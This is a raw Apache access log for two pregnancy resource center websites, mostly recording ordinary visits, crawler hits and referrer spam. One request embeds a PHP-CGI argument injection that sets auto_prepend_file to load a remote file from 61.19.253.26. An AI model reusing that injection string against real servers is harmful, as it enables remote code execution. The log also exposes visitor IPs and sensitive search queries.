24.171.107.50 - - [29/Sep/2013:17:45:16 -0700] "GET /assets/images/redgirl.jpg HTTP/1.1" 200 110627 "http://www.lifelineprc.com/services.html" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)" "www.lifelineprc.com"
24.171.107.50 - - [29/Sep/2013:17:45:27 -0700] "GET /appointment.php HTTP/1.1" 200 1618 "http://www.lifelineprc.com/services.html" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)" "www.lifelineprc.com"
220.181.108.169 - - [29/Sep/2013:17:45:29 -0700] "GET /symptoms.html HTTP/1.1" 200 2396 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" "lifelineprc.com"
24.171.107.50 - - [29/Sep/2013:17:45:36 -0700] "GET /assets/images/lobby.jpg HTTP/1.1" 200 25459 "http://www.lifelineprc.com/locations.html" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)" "www.lifelineprc.com"
24.171.107.50 - - [29/Sep/2013:17:45:36 -0700] "GET /assets/images/building.jpg HTTP/1.1" 200 26305 "http://www.lifelineprc.com/locations.html" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)" "www.lifelineprc.com"
24.171.107.50 - - [29/Sep/2013:17:45:36 -0700] "GET /assets/images/hallway.jpg HTTP/1.1" 200 24415 "http://www.lifelineprc.com/locations.html" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)" "www.lifelineprc.com"
199.30.20.94 - - [29/Sep/2013:17:48:40 -0700] "GET /robots.txt HTTP/1.1" 404 89 "-" "msnbot-media/1.1 (+http://search.msn.com/msnbot.htm)" "www.lifelineprc.com"
199.30.20.94 - - [29/Sep/2013:17:48:40 -0700] "GET /sitebuilder/images/redgirl-152x244.jpg HTTP/1.1" 200 7057 "-" "msnbot-media/1.1 (+http://search.msn.com/msnbot.htm)" "www.lifelineprc.com"
68.184.242.29 - - [29/Sep/2013:17:53:50 -0700] "GET / HTTP/1.1" 200 2585 "http://www.ramahinternational.org/missouri.html" "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.76 Safari/537.36" "www.lifelineprc.com"
68.184.242.29 - - [29/Sep/2013:17:53:50 -0700] "GET /style.css HTTP/1.1" 200 1636 "http://www.lifelineprc.com/" "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.76 Safari/537.36" "www.lifelineprc.com"
68.184.242.29 - - [29/Sep/2013:17:53:50 -0700] "GET /assets/images/homePage.jpg HTTP/1.1" 200 23096 "http://www.lifelineprc.com/" "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.76 Safari/537.36" "www.lifelineprc.com"
68.184.242.29 - - [29/Sep/2013:17:53:51 -0700] "GET /favicon.ico HTTP/1.1" 404 89 "-" "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.76 Safari/537.36" "www.lifelineprc.com"
68.184.242.29 - - [29/Sep/2013:17:53:57 -0700] "GET /services.html HTTP/1.1" 200 2045 "http://www.lifelineprc.com/" "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.76 Safari/537.36" "www.lifelineprc.com"
68.184.242.29 - - [29/Sep/2013:17:53:57 -0700] "GET /assets/images/redgirl.jpg HTTP/1.1" 200 110627 "http://www.lifelineprc.com/services.html" "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.76 Safari/537.36" "www.lifelineprc.com"
157.55.33.182 - - [29/Sep/2013:19:16:18 -0700] "GET /robots.txt HTTP/1.1" 404 89 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "lifelineprc.com"
157.56.229.189 - - [29/Sep/2013:19:36:24 -0700] "GET /robots.txt HTTP/1.1" 404 89 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "www.lifelinepregnancyhelp.org"
46.229.167.149 - - [29/Sep/2013:21:26:42 -0700] "GET / HTTP/1.1" 200 4482 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en-US; rv:1.9.2) Gecko/20091218 Firefox 3.6b5" "www.lifelinepregnancyhelp.org"
176.8.88.134 - - [29/Sep/2013:21:37:36 -0700] "GET /aboutus.html HTTP/1.1" 200 11007 "http://worldlovers.ru/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; Win64; AMD64)" "www.lifelineprc.com"
176.8.88.134 - - [29/Sep/2013:21:37:37 -0700] "GET /aboutus.html HTTP/1.1" 200 11007 "http://worldlovers.ru/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; Win64; AMD64)" "www.lifelineprc.com"
176.8.88.134 - - [29/Sep/2013:21:37:38 -0700] "GET /aboutus.html HTTP/1.1" 200 11007 "http://worldlovers.ru/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; Win64; AMD64)" "www.lifelineprc.com"
199.30.20.94 - - [29/Sep/2013:22:06:52 -0700] "GET /robots.txt HTTP/1.1" 404 89 "-" "msnbot-media/1.1 (+http://search.msn.com/msnbot.htm)" "www.lifelineprc.com"
199.30.20.94 - - [29/Sep/2013:22:06:52 -0700] "GET /sitebuilder/images/redgirl-152x244.jpg HTTP/1.1" 200 7057 "-" "msnbot-media/1.1 (+http://search.msn.com/msnbot.htm)" "www.lifelineprc.com"
199.30.20.72 - - [29/Sep/2013:22:23:53 -0700] "GET /robots.txt HTTP/1.1" 404 89 "-" "msnbot-media/1.1 (+http://search.msn.com/msnbot.htm)" "www.lifelinepregnancyhelp.org"
199.30.20.72 - - [29/Sep/2013:22:23:53 -0700] "GET /assets/images/teenMom.jpg HTTP/1.1" 200 49039 "-" "msnbot-media/1.1 (+http://search.msn.com/msnbot.htm)" "www.lifelinepregnancyhelp.org"
75.156.26.120 - - [29/Sep/2013:23:03:44 -0700] "GET /assets/images/abortion.jpg HTTP/1.1" 200 53176 "http://www.google.co.uk/search?biw=384&bih=320&tbm=isch&sa=1&ei=9RNJUq-JJpK4yAGU1YHQAg&q=thin+rods+obortion+13+weeks&oq=thin+rods+obortion+13+weeks&gs_l=mobile-gws-serp.3..30i10.55051.59342.0.59979.9.9.0.0.0.0.425.2364.2-8j0j1.9.0....0...1c.1j4.27.mobile-gws-serp..1.8.1936.YqCQjmE_Vq0" "Mozilla/5.0 (Linux; Android 4.1.2; LG-E971 Build/JZO54K) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Mobile Safari/535.19" "www.lifelinepregnancyhelp.org"
208.115.113.88 - - [29/Sep/2013:23:52:48 -0700] "GET /robots.txt HTTP/1.1" 404 89 "-" "Mozilla/5.0 (compatible; Ezooms/1.0; ezooms.bot@gmail.com)" "lifelineprc.com"
37.140.141.27 - - [30/Sep/2013:00:41:12 -0700] "GET /robots.txt HTTP/1.1" 404 89 "-" "Mozilla/5.0 (compatible; YandexImages/3.0; +http://yandex.com/bots)" "www.lifelinepregnancyhelp.org"
208.115.113.88 - - [30/Sep/2013:00:55:40 -0700] "GET /options.html HTTP/1.1" 200 5870 "-" "Mozilla/5.0 (compatible; Ezooms/1.0; ezooms.bot@gmail.com)" "lifelineprc.com"
37.140.141.27 - - [30/Sep/2013:01:09:17 -0700] "GET /assets/images/man.jpg HTTP/1.1" 200 24927 "-" "Mozilla/5.0 (compatible; YandexImages/3.0; +http://yandex.com/bots)" "www.lifelinepregnancyhelp.org"
198.50.204.211 - - [30/Sep/2013:01:46:04 -0700] "GET / HTTP/1.0" 200 4482 "-" "Mozilla/4.0 (compatible; ICS)" "lifelineprc.com"
157.56.229.189 - - [30/Sep/2013:02:40:06 -0700] "GET /robots.txt HTTP/1.1" 404 89 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "lifelinepregnancyhelp.org"
54.225.17.146 - - [30/Sep/2013:03:32:44 -0700] "GET / HTTP/1.1" 200 2585 "-" "Mozilla/5.0 (Windows NT 5.1; rv:17.0) Gecko/20100101 Firefox/17.0" "lifelineprc.com"
54.225.17.146 - - [30/Sep/2013:03:32:44 -0700] "GET / HTTP/1.1" 200 2585 "-" "Mozilla/5.0 (Windows NT 5.1; rv:17.0) Gecko/20100101 Firefox/17.0" "lifelineprc.com"
54.225.17.146 - - [30/Sep/2013:03:32:45 -0700] "GET /style.css HTTP/1.1" 200 1636 "http://lifelineprc.com/" "Mozilla/5.0 (Windows NT 5.1; rv:17.0) Gecko/20100101 Firefox/17.0" "lifelineprc.com"
54.225.17.146 - - [30/Sep/2013:03:32:45 -0700] "GET /assets/images/homePage.jpg HTTP/1.1" 200 23096 "http://lifelineprc.com/" "Mozilla/5.0 (Windows NT 5.1; rv:17.0) Gecko/20100101 Firefox/17.0" "lifelineprc.com"
54.225.17.146 - - [30/Sep/2013:03:32:45 -0700] "GET / HTTP/1.1" 200 2474 "http://lifelineprc.com/" "Mozilla/5.0 (Windows NT 5.1; rv:17.0) Gecko/20100101 Firefox/17.0" "lifelineprc.com"
54.225.17.146 - - [30/Sep/2013:03:32:45 -0700] "GET /assets/bodyBG.jpg HTTP/1.1" 200 11603 "http://lifelineprc.com/" "Mozilla/5.0 (Windows NT 5.1; rv:17.0) Gecko/20100101 Firefox/17.0" "lifelineprc.com"
54.225.17.146 - - [30/Sep/2013:03:32:45 -0700] "GET / HTTP/1.1" 200 2474 "http://lifelineprc.com/" "Mozilla/5.0 (Windows NT 5.1; rv:17.0) Gecko/20100101 Firefox/17.0" "lifelineprc.com"
54.225.17.146 - - [30/Sep/2013:03:32:45 -0700] "GET /style.css HTTP/1.1" 200 1636 "http://lifelineprc.com/" "Mozilla/5.0 (Windows NT 5.1; rv:17.0) Gecko/20100101 Firefox/17.0" "lifelineprc.com"
54.225.17.146 - - [30/Sep/2013:03:32:45 -0700] "GET /assets/images/homePage.jpg HTTP/1.1" 200 23096 "http://lifelineprc.com/" "Mozilla/5.0 (Windows NT 5.1; rv:17.0) Gecko/20100101 Firefox/17.0" "lifelineprc.com"
91.207.4.206 - - [30/Sep/2013:03:36:38 -0700] "GET /aboutus.html HTTP/1.1" 200 11007 "http://znakomstvaonlain.ru/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; APC; .NET CLR 1.0.3705; .NET CLR 1.1.4322; .NET CLR 2.0.50215; InfoPath.1)" "www.lifelineprc.com"
91.207.4.206 - - [30/Sep/2013:03:36:39 -0700] "GET /aboutus.html HTTP/1.1" 200 11007 "http://znakomstvaonlain.ru/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; APC; .NET CLR 1.0.3705; .NET CLR 1.1.4322; .NET CLR 2.0.50215; InfoPath.1)" "www.lifelineprc.com"
91.207.4.206 - - [30/Sep/2013:03:36:40 -0700] "GET /aboutus.html HTTP/1.1" 200 11007 "http://znakomstvaonlain.ru/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; APC; .NET CLR 1.0.3705; .NET CLR 1.1.4322; .NET CLR 2.0.50215; InfoPath.1)" "www.lifelineprc.com"
92.98.134.31 - - [30/Sep/2013:03:46:40 -0700] "GET /?-dsafe_mode%3dOff+-ddisable_functions%3dNULL+-dallow_url_fopen%3dOn+-dallow_url_include%3dOn+-dauto_prepend_file%3dhttp%3A%2F%2F61.19.253.26%2Fecho.txt HTTP/1.1" 200 4482 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20100101 Firefox/23.0" "lifelineprc.com"
157.55.35.101 - - [30/Sep/2013:03:59:39 -0700] "GET /robots.txt HTTP/1.1" 404 89 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "lifelinepregnancyhelp.org"
100.43.83.135 - - [30/Sep/2013:05:27:20 -0700] "GET /robots.txt HTTP/1.1" 404 89 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" "www.lifelinepregnancyhelp.org"
54.225.17.146 - - [30/Sep/2013:05:40:15 -0700] "GET / HTTP/1.1" 200 2596 "-" "Mozilla/5.0 (Windows NT 5.1; rv:17.0) Gecko/20100101 Firefox/17.0" "lifelinepregnancyhelp.org"
54.225.17.146 - - [30/Sep/2013:05:40:15 -0700] "GET / HTTP/1.1" 200 2596 "-" "Mozilla/5.0 (Windows NT 5.1; rv:17.0) Gecko/20100101 Firefox/17.0" "lifelinepregnancyhelp.org"
54.225.17.146 - - [30/Sep/2013:05:40:15 -0700] "GET /style.css HTTP/1.1" 200 1636 "http://lifelinepregnancyhelp.org/" "Mozilla/5.0 (Windows NT 5.1; rv:17.0) Gecko/20100101 Firefox/17.0" "lifelinepregnancyhelp.org"
54.225.17.146 - - [30/Sep/2013:05:40:15 -0700] "GET /assets/images/homePage.jpg HTTP/1.1" 200 23096 "http://lifelinepregnancyhelp.org/" "Mozilla/5.0 (Windows NT 5.1; rv:17.0) Gecko/20100101 Firefox/17.0" "lifelinepregnancyhelp.org"
54.225.17.146 - - [30/Sep/2013:05:40:15 -0700] "GET / HTTP/1.1" 200 2475 "http://lifelinepregnancyhelp.org/" "Mozilla/5.0 (Windows NT 5.1; rv:17.0) Gecko/20100101 Firefox/17.0" "lifelinepregnancyhelp.org"
54.225.17.146 - - [30/Sep/2013:05:40:15 -0700] "GET /assets/bodyBG.jpg HTTP/1.1" 200 11603 "http://lifelinepregnancyhelp.org/" "Mozilla/5.0 (Windows NT 5.1; rv:17.0) Gecko/20100101 Firefox/17.0" "lifelinepregnancyhelp.org"
54.225.17.146 - - [30/Sep/2013:05:40:15 -0700] "GET /assets/psd/LeftNavLayoutPieces/top.jpg HTTP/1.1" 200 43470 "http://lifelinepregnancyhelp.org/" "Mozilla/5.0 (Windows NT 5.1; rv:17.0) Gecko/20100101 Firefox/17.0" "lifelinepregnancyhelp.org"
54.225.17.146 - - [30/Sep/2013:05:40:15 -0700] "GET /assets/psd/LeftNavLayoutPieces/bgcolor.jpg HTTP/1.1" 200 4012 "http://lifelinepregnancyhelp.org/" "Mozilla/5.0 (Windows NT 5.1; rv:17.0) Gecko/20100101 Firefox/17.0" "lifelinepregnancyhelp.org"
54.225.17.146 - - [30/Sep/2013:05:40:16 -0700] "GET / HTTP/1.1" 200 2475 "http://lifelinepregnancyhelp.org/" "Mozilla/5.0 (Windows NT 5.1; rv:17.0) Gecko/20100101 Firefox/17.0" "lifelinepregnancyhelp.org"
54.225.17.146 - - [30/Sep/2013:05:40:16 -0700] "GET /style.css HTTP/1.1" 200 1636 "http://lifelinepregnancyhelp.org/" "Mozilla/5.0 (Windows NT 5.1; rv:17.0) Gecko/20100101 Firefox/17.0" "lifelinepregnancyhelp.org"
54.225.17.146 - - [30/Sep/2013:05:40:16 -0700] "GET /assets/bodyBG.jpg HTTP/1.1" 200 11603 "http://lifelinepregnancyhelp.org/" "Mozilla/5.0 (Windows NT 5.1; rv:17.0) Gecko/20100101 Firefox/17.0" "lifelinepregnancyhelp.org"
54.225.17.146 - - [30/Sep/2013:05:40:16 -0700] "GET /assets/psd/LeftNavLayoutPieces/top.jpg HTTP/1.1" 200 43470 "http://lifelinepregnancyhelp.org/" "Mozilla/5.0 (Windows NT 5.1; rv:17.0) Gecko/20100101 Firefox/17.0" "lifelinepregnancyhelp.org"
54.225.17.146 - - [30/Sep/2013:05:40:17 -0700] "GET /assets/psd/LeftNavLayoutPieces/bgcolor.jpg HTTP/1.1" 200 4012 "http://lifelinepregnancyhelp.org/" "Mozilla/5.0 (Windows NT 5.1; rv:17.0) Gecko/20100101 Firefox/17.0" "lifelinepregnancyhelp.org"
54.225.17.146 - - [30/Sep/2013:05:40:17 -0700] "GET /assets/images/homePage.jpg HTTP/1.1" 200 23096 "http://lifelinepregnancyhelp.org/" "Mozilla/5.0 (Windows NT 5.1; rv:17.0) Gecko/20100101 Firefox/17.0" "lifelinepregnancyhelp.org"
199.30.24.122 - - [30/Sep/2013:05:49:09 -0700] "GET /symptoms.html HTTP/1.1" 200 2508 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b" "lifelineprc.com"
199.30.24.122 - - [30/Sep/2013:05:49:10 -0700] "GET /style.css HTTP/1.1" 200 1636 "http://lifelineprc.com/symptoms.html" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b" "lifelineprc.com"
199.30.24.122 - - [30/Sep/2013:05:49:10 -0700] "GET /assets/images/pregnancy.jpg HTTP/1.1" 200 73198 "http://lifelineprc.com/symptoms.html" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b" "lifelineprc.com"
199.30.24.122 - - [30/Sep/2013:05:49:10 -0700] "GET /assets/bodyBG.jpg HTTP/1.1" 200 11603 "http://lifelineprc.com/symptoms.html" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b" "lifelineprc.com"
199.30.24.122 - - [30/Sep/2013:05:49:10 -0700] "GET /assets/psd/LeftNavLayoutPieces/top.jpg HTTP/1.1" 200 43470 "http://lifelineprc.com/symptoms.html" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b" "lifelineprc.com"
65.55.213.255 - - [30/Sep/2013:07:36:28 -0700] "GET /style.css HTTP/1.1" 200 1636 "http://www.lifelinepregnancyhelp.org/locations.html" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1;  SLCC1;  .NET CLR 1.1.4322;  .NET CLR 2.0.40607;  .NET CLR 3.0.04506.648)" "www.lifelinepregnancyhelp.org"
37.115.189.101 - - [30/Sep/2013:07:46:19 -0700] "GET /aboutus.html HTTP/1.1" 200 11007 "http://remont-comp-pomosh.ru/" "Opera/8.01 (Windows NT 5.1)" "www.lifelineprc.com"
37.115.189.101 - - [30/Sep/2013:07:46:20 -0700] "GET /aboutus.html HTTP/1.1" 200 11007 "http://www.soblaznu.net/" "Opera/8.01 (Windows NT 5.1)" "www.lifelineprc.com"
37.115.189.101 - - [30/Sep/2013:07:46:20 -0700] "GET /aboutus.html HTTP/1.1" 200 11007 "http://remont-comp-pomosh.ru/" "Opera/8.01 (Windows NT 5.1)" "www.lifelineprc.com"
37.115.189.101 - - [30/Sep/2013:07:46:22 -0700] "GET /aboutus.html HTTP/1.1" 200 11007 "http://www.soblaznu.net/" "Opera/8.01 (Windows NT 5.1)" "www.lifelineprc.com"
176.8.88.134 - - [30/Sep/2013:08:03:17 -0700] "GET /aboutus.html HTTP/1.1" 200 11007 "http://udobno67.ru/" "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0; .NET CLR 1.1.4322)" "www.lifelineprc.com"
176.8.88.134 - - [30/Sep/2013:08:03:17 -0700] "GET /aboutus.html HTTP/1.1" 200 11007 "http://gametor.su/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows XP)" "www.lifelineprc.com"
176.8.88.134 - - [30/Sep/2013:08:03:17 -0700] "GET /aboutus.html HTTP/1.1" 200 11007 "http://gametor.su/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows XP)" "www.lifelineprc.com"
176.8.88.134 - - [30/Sep/2013:08:03:18 -0700] "GET /aboutus.html HTTP/1.1" 200 11007 "http://udobno67.ru/" "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0; .NET CLR 1.1.4322)" "www.lifelineprc.com"
176.8.88.134 - - [30/Sep/2013:08:03:18 -0700] "GET /aboutus.html HTTP/1.1" 200 11007 "http://gametor.su/" "Mozilla/4.0 (compatible; MSIE 6.0; Windows XP)" "www.lifelineprc.com"
67.221.222.72 - - [30/Sep/2013:08:04:47 -0700] "GET /assets/images/homePage.jpg HTTP/1.1" 200 23096 "http://www.lifelineprc.com/" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.76 Safari/537.36" "www.lifelineprc.com"
100.43.83.135 - - [30/Sep/2013:08:52:41 -0700] "GET /ewyl.html HTTP/1.1" 200 2302 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" "www.lifelinepregnancyhelp.org"
157.56.93.85 - - [30/Sep/2013:09:04:55 -0700] "GET /robots.txt HTTP/1.1" 404 89 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "lifelineprc.com"
70.252.136.201 - - [30/Sep/2013:09:28:00 -0700] "GET / HTTP/1.1" 200 2475 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0; yie9)" "www.lifelinepregnancyhelp.org"
70.252.136.201 - - [30/Sep/2013:09:28:00 -0700] "GET /assets/images/homePage.jpg HTTP/1.1" 200 23096 "http://www.lifelinepregnancyhelp.org/" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0; yie9)" "www.lifelinepregnancyhelp.org"
70.252.136.201 - - [30/Sep/2013:09:28:00 -0700] "GET /assets/bodyBG.jpg HTTP/1.1" 200 11603 "http://www.lifelinepregnancyhelp.org/" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0; yie9)" "www.lifelinepregnancyhelp.org"
70.252.136.201 - - [30/Sep/2013:09:28:00 -0700] "GET /assets/psd/LeftNavLayoutPieces/bgcolor.jpg HTTP/1.1" 200 4012 "http://www.lifelinepregnancyhelp.org/" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0; yie9)" "www.lifelinepregnancyhelp.org"
70.252.136.201 - - [30/Sep/2013:09:28:08 -0700] "GET /options.html HTTP/1.1" 200 3010 "http://www.lifelinepregnancyhelp.org/" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0; yie9)" "www.lifelinepregnancyhelp.org"
70.252.136.201 - - [30/Sep/2013:09:28:09 -0700] "GET /assets/images/teenMom.jpg HTTP/1.1" 200 49039 "http://www.lifelinepregnancyhelp.org/options.html" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0; yie9)" "www.lifelinepregnancyhelp.org"
70.252.136.201 - - [30/Sep/2013:09:28:09 -0700] "GET /Scripts/AC_RunActiveContent.js HTTP/1.1" 200 2928 "http://www.lifelinepregnancyhelp.org/options.html" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0; yie9)" "www.lifelinepregnancyhelp.org"
70.252.136.201 - - [30/Sep/2013:09:28:09 -0700] "GET /assets/images/aboutLove.jpg HTTP/1.1" 200 52630 "http://www.lifelinepregnancyhelp.org/options.html" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0; yie9)" "www.lifelinepregnancyhelp.org"
70.252.136.201 - - [30/Sep/2013:09:28:09 -0700] "GET /Scripts/AC_ActiveX.js HTTP/1.1" 200 1145 "http://www.lifelinepregnancyhelp.org/options.html" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0; yie9)" "www.lifelinepregnancyhelp.org"
70.252.136.201 - - [30/Sep/2013:09:28:09 -0700] "GET /assets/images/medTestimony.jpg HTTP/1.1" 200 64550 "http://www.lifelinepregnancyhelp.org/options.html" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0; yie9)" "www.lifelinepregnancyhelp.org"
70.252.136.201 - - [30/Sep/2013:09:28:30 -0700] "GET /services.html HTTP/1.1" 200 2046 "http://www.lifelinepregnancyhelp.org/options.html" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0; yie9)" "www.lifelinepregnancyhelp.org"
70.252.136.201 - - [30/Sep/2013:09:28:30 -0700] "GET /assets/images/redgirl.jpg HTTP/1.1" 200 110627 "http://www.lifelinepregnancyhelp.org/services.html" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0; yie9)" "www.lifelinepregnancyhelp.org"
70.252.136.201 - - [30/Sep/2013:09:28:34 -0700] "GET /forMen.html HTTP/1.1" 200 2331 "http://www.lifelinepregnancyhelp.org/services.html" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0; yie9)" "www.lifelinepregnancyhelp.org"
70.252.136.201 - - [30/Sep/2013:09:28:34 -0700] "GET /assets/images/man.jpg HTTP/1.1" 200 24927 "http://www.lifelinepregnancyhelp.org/forMen.html" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0; yie9)" "www.lifelinepregnancyhelp.org"
70.252.136.201 - - [30/Sep/2013:09:28:57 -0700] "GET /dadline.html HTTP/1.1" 200 2178 "http://www.lifelinepregnancyhelp.org/forMen.html" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0; yie9)" "www.lifelinepregnancyhelp.org"
70.252.136.201 - - [30/Sep/2013:09:28:57 -0700] "GET /assets/images/dadline.jpg HTTP/1.1" 200 15054 "http://www.lifelinepregnancyhelp.org/dadline.html" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0; yie9)" "www.lifelinepregnancyhelp.org"
64.125.188.25 - - [30/Sep/2013:09:49:33 -0700] "GET /favicon.ico HTTP/1.1" 404 89 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.1) Gecko/2008070208 Firefox/3.0.1" "www.lifelineprc.com"
208.184.77.186 - - [30/Sep/2013:09:50:45 -0700] "GET /assets/psd/LeftNavLayoutPieces/top.jpg HTTP/1.1" 200 43470 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.1) Gecko/2008070208 Firefox/3.0.1" "www.lifelineprc.com"
5.10.83.95 - - [30/Sep/2013:10:02:17 -0700] "GET /options.html HTTP/1.1" 200 3012 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.0; +http://ahrefs.com/robot/)" "www.lifelinepregnancyhelp.org"
208.115.111.72 - - [30/Sep/2013:10:38:30 -0700] "GET /forMen.html HTTP/1.1" 200 3569 "-" "Mozilla/5.0 (compatible; Ezooms/1.0; ezooms.bot@gmail.com)" "lifelineprc.com"
5.10.83.24 - - [30/Sep/2013:10:38:43 -0700] "GET /abortion.html HTTP/1.1" 200 3409 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.0; +http://ahrefs.com/robot/)" "www.lifelineprc.com"
157.56.93.85 - - [30/Sep/2013:10:43:23 -0700] "GET /robots.txt HTTP/1.1" 404 89 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "www.lifelineprc.com"
5.10.83.32 - - [30/Sep/2013:10:49:59 -0700] "GET /dadline.html HTTP/1.1" 200 2179 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.0; +http://ahrefs.com/robot/)" "www.lifelineprc.com"
5.10.83.46 - - [30/Sep/2013:12:02:14 -0700] "GET /ewyl.html HTTP/1.1" 200 2302 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.0; +http://ahrefs.com/robot/)" "lifelinepregnancyhelp.org"
94.153.64.140 - - [30/Sep/2013:12:12:03 -0700] "GET /aboutus.html HTTP/1.1" 200 11007 "http://albummusic.net/" "Mozilla/5.0 (Windows NT 5.1; U; en) Opera 8.00" "www.lifelineprc.com"
94.153.64.140 - - [30/Sep/2013:12:12:04 -0700] "GET /aboutus.html HTTP/1.1" 200 11007 "http://albummusic.net/" "Mozilla/5.0 (Windows NT 5.1; U; en) Opera 8.00" "www.lifelineprc.com"
94.153.64.140 - - [30/Sep/2013:12:12:05 -0700] "GET /aboutus.html HTTP/1.1" 200 11007 "http://albummusic.net/" "Mozilla/5.0 (Windows NT 5.1; U; en) Opera 8.00" "www.lifelineprc.com"
79.113.84.217 - - [30/Sep/2013:12:34:13 -0700] "GET / HTTP/1.1" 200 4482 "-" "-" "lifelinepregnancyhelp.org"
168.166.80.168 - - [30/Sep/2013:12:35:25 -0700] "GET /LinnCountyPRC.html HTTP/1.1" 200 10906 "http://www.google.com/search?sourceid=navclient&aq=&oq=LInn+County+Pregr&ie=UTF-8&rlz=1T4RNRN_enUS434US447&q=linn+county+pregnancy+resource+center+&gs_l=hp..0.0i22i30.0.0.0.8015...........0.L-3NaupQH9g&safe=active" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; GTB7.5; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)" "www.lifelineprc.com"
168.166.80.168 - - [30/Sep/2013:12:35:26 -0700] "GET /sitebuilder/images/pink_petals_top_menu_background2-1032x34.jpg HTTP/1.1" 200 3899 "http://www.lifelineprc.com/LinnCountyPRC.html" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; GTB7.5; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)" "www.lifelineprc.com"
